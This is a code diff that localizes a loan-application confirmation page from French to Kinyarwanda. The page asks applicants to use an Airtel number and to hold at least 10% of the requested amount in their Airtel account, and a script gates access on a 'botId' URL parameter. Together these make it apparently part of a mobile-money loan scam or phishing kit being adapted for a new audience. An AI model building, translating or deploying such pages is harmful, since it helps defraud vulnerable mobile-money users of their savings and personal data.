@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="rw">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Succès</title>
+<title>Byagenze neza</title>
 <style>
 * {
     margin: 0;
@@ -99,25 +99,25 @@ p {
 <body>
 
 <div class="success-container">
-    <h2>Demande de prêt soumise avec succès !</h2>
+    <h2>Usaba inguzanyo byagenze neza !</h2>
     <p>
-        Votre demande a été soumise avec succès. Elle est actuellement en cours d'examen par notre équipe.
-        Vous recevrez un message de notre part une fois l'examen terminé.
-        Les candidats doivent satisfaire aux exigences spécifiées pour que la demande soit traitée.
+        Icyifuzo cyawe cyoherejwe neza. Kiri mu isuzumwa n'itsinda ryacu.
+        Uzabona ubutumwa buva kuri twe iyo isuzumwa rirangiye.
+        Abasaba bagomba kuzuza ibyangombwa byavuzwe kugira ngo icyifuzo gikorwe.
     </p>
 
     <div class="loan-notice">
-        <strong>Avis d'éligibilité :</strong>
+        <strong>Itangazo ry'ibyemewe :</strong>
         <ol>
-            <li>Vous devez postuler en utilisant un numéro Airtel valide.</li>
-            <li>Vous devez avoir au moins 10 % du montant demandé sur votre compte Airtel.</li>
+            <li>Ugomba gusaba ukoresheje numero ya Airtel ikora.</li>
+            <li>Ugomba kugira byibuze 10 % by'ingano usaba kuri konti ya Airtel.</li>
         </ol>
     </div>
 </div>
 
 <script>
 let botId = new URLSearchParams(window.location.search).get('botId');
-if (!botId) { alert("Lien d'accès invalide"); throw new Error("botId missing"); }
+if (!botId) { alert("Umurongo wo kwinjiramo siwo"); throw new Error("botId missing"); }
 localStorage.setItem('botId', botId);
 </script>
 
